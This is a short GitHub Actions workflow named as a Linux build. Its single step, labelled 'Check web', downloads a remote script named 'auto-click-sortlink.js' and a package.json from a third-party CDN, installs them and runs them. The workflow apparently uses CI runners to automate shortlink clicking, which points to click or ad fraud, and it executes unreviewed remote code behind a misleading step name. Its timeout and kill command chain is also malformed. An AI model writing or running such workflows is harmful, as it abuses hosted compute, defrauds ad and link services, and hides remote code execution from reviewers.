name: auto-build-linux
on: 
  workflow_dispatch:
defaults:
  run:
    shell: bash

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - name: Check web
      run: |
        curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/auto-click-sortlink.js --output index.js && curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s &&  timeout 6m killall -9 node && npm start
